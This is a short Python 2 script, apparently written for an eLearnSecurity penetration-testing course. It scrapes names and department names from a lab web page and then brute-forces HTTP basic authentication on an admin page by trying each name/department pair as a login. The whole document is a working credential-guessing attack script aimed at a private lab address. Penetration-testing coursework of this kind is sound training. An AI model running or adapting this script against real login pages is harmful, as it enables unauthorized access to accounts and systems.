#During elearnsecurity course PTS

import requests
from bs4 import BeautifulSoup as bs4

'''
In this some we will first grab some username and departments names using bs4
than we will start the guessing process '''

def download_page(url):
    r = requests.get(url)
    response = r.content
    return response

def findnames(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='name')
    output = []
    for name in names:
        output.append(name.text)
    return output

def findDepts(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='department')
    output = []
    for name in names:
        output.append(name.text)
    return output

def getAuthorized(url, username, password):
    r = requests.get(url, auth=(username, password))
    if str(r.status_code) != '401':
        print "\n[!] Username: " + username + " Password: " + password + " Code: " + str(r.status_code) + '\n'

page = download_page("http://192.168.0.100")

names = findnames(page)
uniqNames = sorted(set(names))

depts = findDepts(page)
uniqDepts = sorted(set(depts))

print "[+] Working... "
for name in uniqNames:
    for depts in uniqDepts:
        getAuthorized('http://192.168.0.100/admin.php', name, depts)